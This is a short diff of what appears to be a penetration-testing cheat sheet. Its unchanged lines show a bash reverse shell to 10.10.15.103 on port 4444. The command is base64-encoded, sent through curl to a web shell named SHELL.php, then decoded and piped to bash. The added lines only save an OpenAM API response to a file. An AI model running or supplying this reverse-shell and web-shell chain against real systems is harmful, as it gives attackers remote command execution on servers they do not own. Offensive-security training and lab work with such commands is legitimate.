@@ -62,3 +62,8 @@ echo -n 'bash -i >& /dev/tcp/10.10.15.103/4444 0>&1' | base64 -w0
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMDMvNDQ0NCAwPiYx
 
 curl -G "http://example.com/files/SHELL.php" --data-urlencode 'c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMDMvNDQ0NCAwPiYx | base64 -d | bash'
+
+
+## Ouput to a file
+
+curl -sk 'https://sso.example.com/openam/json/authenticate?_api' -o api-version-info.txt
